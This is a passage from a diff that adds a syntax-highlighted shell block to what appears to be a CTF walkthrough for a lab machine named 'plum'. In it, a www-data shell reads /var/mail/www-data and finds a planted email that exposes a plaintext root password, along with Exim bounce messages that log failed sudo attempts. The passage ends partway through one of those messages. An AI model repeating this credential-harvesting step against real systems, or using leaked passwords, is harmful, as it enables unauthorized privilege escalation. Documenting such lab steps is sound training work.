+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
+</span><span class="lnt">276
+</span><span class="lnt">277
+</span><span class="lnt">278
+</span><span class="lnt">279
+</span><span class="lnt">280
+</span><span class="lnt">281
+</span><span class="lnt">282
+</span><span class="lnt">283
+</span><span class="lnt">284
+</span><span class="lnt">285
+</span><span class="lnt">286
+</span><span class="lnt">287
+</span><span class="lnt">288
+</span><span class="lnt">289
+</span><span class="lnt">290
+</span><span class="lnt">291
+</span><span class="lnt">292
+</span><span class="lnt">293
+</span><span class="lnt">294
+</span><span class="lnt">295
+</span><span class="lnt">296
+</span><span class="lnt">297
+</span><span class="lnt">298
+</span><span class="lnt">299
+</span><span class="lnt">300
+</span><span class="lnt">301
+</span><span class="lnt">302
+</span><span class="lnt">303
+</span><span class="lnt">304
+</span><span class="lnt">305
+</span><span class="lnt">306
+</span><span class="lnt">307
+</span><span class="lnt">308
+</span><span class="lnt">309
+</span><span class="lnt">310
+</span><span class="lnt">311
+</span><span class="lnt">312
+</span><span class="lnt">313
+</span><span class="lnt">314
+</span><span class="lnt">315
+</span><span class="lnt">316
+</span><span class="lnt">317
+</span><span class="lnt">318
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@plum:/tmp$ cat /var/mail/www-data
+</span></span><span class="line"><span class="cl">cat /var/mail/www-data
+</span></span><span class="line"><span class="cl">From root@localhost Fri Aug <span class="m">25</span> 06:31:47 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">Return-path: &lt;root@localhost&gt;
+</span></span><span class="line"><span class="cl">Envelope-to: www-data@localhost
+</span></span><span class="line"><span class="cl">Delivery-date: Fri, <span class="m">25</span> Aug <span class="m">2023</span> 06:31:47 -0400
+</span></span><span class="line"><span class="cl">Received: from root by localhost with <span class="nb">local</span> <span class="o">(</span>Exim 4.94.2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">(</span>envelope-from &lt;root@localhost&gt;<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        id 1qZU6V-0000El-Pw
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> www-data@localhost<span class="p">;</span> Fri, <span class="m">25</span> Aug <span class="m">2023</span> 06:31:47 -0400
+</span></span><span class="line"><span class="cl">To: www-data@localhost
+</span></span><span class="line"><span class="cl">From: root@localhost
+</span></span><span class="line"><span class="cl">Subject: URGENT - DDOS ATTACK<span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Reply-to: root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1qZU6V-0000El-Pw@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Fri, 25 Aug 2023 06:31:47 -0400
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">We are under attack. We&#39;ve been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:  
+</span></span></span><span class="line"><span class="cl"><span class="s2">root:6s8kaZZNaZZYBMfh2YEW
+</span></span></span><span class="line"><span class="cl"><span class="s2">Thanks,
+</span></span></span><span class="line"><span class="cl"><span class="s2">Administrator
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">From MAILER-DAEMON Mon Dec 04 10:02:09 2023
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Envelope-to: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Delivery-date: Mon, 04 Dec 2023 10:02:09 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from Debian-exim by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rAASX-0001gi-JO
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for www-data@localhost; Mon, 04 Dec 2023 10:02:09 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">X-Failed-Recipients: debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-replied
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">References: &lt;E1rAASX-0001fo-IY@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: multipart/report; report-type=delivery-status; boundary=1701702129-eximdsn-2095242606
+</span></span></span><span class="line"><span class="cl"><span class="s2">MIME-Version: 1.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: Mail delivery failed: returning message to sender
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rAASX-0001gi-JO@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:02:09 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701702129-eximdsn-2095242606
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: text/plain; charset=us-ascii
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">This message was created automatically by mail delivery software.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">A message that you sent could not be delivered to one or more of its
+</span></span></span><span class="line"><span class="cl"><span class="s2">recipients. This is a permanent error. The following address(es) failed:
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">  debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">    (generated from root@localhost)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Unrouteable address
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701702129-eximdsn-2095242606
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/delivery-status
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Reporting-MTA: dns; localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Action: failed
+</span></span></span><span class="line"><span class="cl"><span class="s2">Final-Recipient: rfc822;root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Status: 5.0.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701702129-eximdsn-2095242606
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/rfc822
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from www-data by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        (envelope-from &lt;www-data@localhost&gt;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rAASX-0001fo-IY
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for root@localhost; Mon, 04 Dec 2023 10:02:09 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-generated
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: *** SECURITY information for localhost ***
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: www-data &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rAASX-0001fo-IY@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:02:09 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">localhost : Dec  4 15:02:09 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701702129-eximdsn-2095242606--
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">From MAILER-DAEMON Mon Dec 04 10:06:20 2023
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Envelope-to: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Delivery-date: Mon, 04 Dec 2023 10:06:20 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from Debian-exim by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rAAWa-0004Mp-Vl
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for www-data@localhost; Mon, 04 Dec 2023 10:06:20 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">X-Failed-Recipients: debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-replied
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">References: &lt;E1rAAWa-0004Mm-VK@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: multipart/report; report-type=delivery-status; boundary=1701702380-eximdsn-199798543
+</span></span></span><span class="line"><span class="cl"><span class="s2">MIME-Version: 1.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: Mail delivery failed: returning message to sender
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rAAWa-0004Mp-Vl@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:06:20 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701702380-eximdsn-199798543
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: text/plain; charset=us-ascii
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">This message was created automatically by mail delivery software.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">A message that you sent could not be delivered to one or more of its
+</span></span></span><span class="line"><span class="cl"><span class="s2">recipients. This is a permanent error. The following address(es) failed:
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">  debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">    (generated from root@localhost)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Unrouteable address
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701702380-eximdsn-199798543
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/delivery-status
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Reporting-MTA: dns; localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Action: failed
+</span></span></span><span class="line"><span class="cl"><span class="s2">Final-Recipient: rfc822;root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Status: 5.0.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701702380-eximdsn-199798543
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/rfc822
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from www-data by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        (envelope-from &lt;www-data@localhost&gt;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rAAWa-0004Mm-VK
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for root@localhost; Mon, 04 Dec 2023 10:06:20 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-generated
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: *** SECURITY information for localhost ***
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: www-data &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rAAWa-0004Mm-VK@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:06:20 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">localhost : Dec  4 15:06:20 : www-data : a password is required ; PWD=/tmp ; USER=root ; COMMAND=list
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701702380-eximdsn-199798543--
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">From MAILER-DAEMON Mon Dec 04 10:31:07 2023
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Envelope-to: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Delivery-date: Mon, 04 Dec 2023 10:31:07 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from Debian-exim by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rAAuZ-0004Px-Lf
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for www-data@localhost; Mon, 04 Dec 2023 10:31:07 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">X-Failed-Recipients: debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-replied
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">References: &lt;E1rAAuZ-0004Pu-LF@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: multipart/report; report-type=delivery-status; boundary=1701703867-eximdsn-1899843490
+</span></span></span><span class="line"><span class="cl"><span class="s2">MIME-Version: 1.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: Mail delivery failed: returning message to sender
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rAAuZ-0004Px-Lf@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:31:07 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701703867-eximdsn-1899843490
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: text/plain; charset=us-ascii
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">This message was created automatically by mail delivery software.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">A message that you sent could not be delivered to one or more of its
+</span></span></span><span class="line"><span class="cl"><span class="s2">recipients. This is a permanent error. The following address(es) failed:
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">  debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">    (generated from root@localhost)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Unrouteable address
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701703867-eximdsn-1899843490
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/delivery-status
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Reporting-MTA: dns; localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Action: failed
+</span></span></span><span class="line"><span class="cl"><span class="s2">Final-Recipient: rfc822;root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Status: 5.0.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701703867-eximdsn-1899843490
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/rfc822
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from www-data by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        (envelope-from &lt;www-data@localhost&gt;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rAAuZ-0004Pu-LF
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for root@localhost; Mon, 04 Dec 2023 10:31:07 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-generated
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: *** SECURITY information for localhost ***
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: www-data &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rAAuZ-0004Pu-LF@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:31:07 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">localhost : Dec  4 15:31:07 : www-data : a password is required ; PWD=/var/mail ; USER=root ; COMMAND=list
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701703867-eximdsn-1899843490--
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">From MAILER-DAEMON Mon Dec 04 10:47:49 2023
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Envelope-to: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Delivery-date: Mon, 04 Dec 2023 10:47:49 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from Debian-exim by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rABAj-0004RS-6L
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for www-data@localhost; Mon, 04 Dec 2023 10:47:49 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">X-Failed-Recipients: debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-replied
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">References: &lt;E1rABAj-0004RP-5y@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: multipart/report; report-type=delivery-status; boundary=1701704869-eximdsn-523599222
+</span></span></span><span class="line"><span class="cl"><span class="s2">MIME-Version: 1.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: Mail delivery failed: returning message to sender
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rABAj-0004RS-6L@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:47:49 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701704869-eximdsn-523599222
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: text/plain; charset=us-ascii
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">This message was created automatically by mail delivery software.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">A message that you sent could not be delivered to one or more of its
+</span></span></span><span class="line"><span class="cl"><span class="s2">recipients. This is a permanent error. The following address(es) failed:
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">  debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">    (generated from root@localhost)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Unrouteable address
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701704869-eximdsn-523599222
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/delivery-status
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Reporting-MTA: dns; localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Action: failed
+</span></span></span><span class="line"><span class="cl"><span class="s2">Final-Recipient: rfc822;root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Status: 5.0.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701704869-eximdsn-523599222
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/rfc822
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from www-data by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        (envelope-from &lt;www-data@localhost&gt;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rABAj-0004RP-5y
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for root@localhost; Mon, 04 Dec 2023 10:47:49 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-generated
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: *** SECURITY information for localhost ***
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: www-data &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rABAj-0004RP-5y@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:47:49 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">localhost : Dec  4 15:47:49 : www-data : a password is required ; PWD=/var/mail ; USER=root ; COMMAND=list
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701704869-eximdsn-523599222--
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">From MAILER-DAEMON Mon Dec 04 10:55:26 2023
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Envelope-to: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Delivery-date: Mon, 04 Dec 2023 10:55:26 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from Debian-exim by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rABI6-0004Rq-Tm
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for www-data@localhost; Mon, 04 Dec 2023 10:55:26 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">X-Failed-Recipients: debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-replied
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
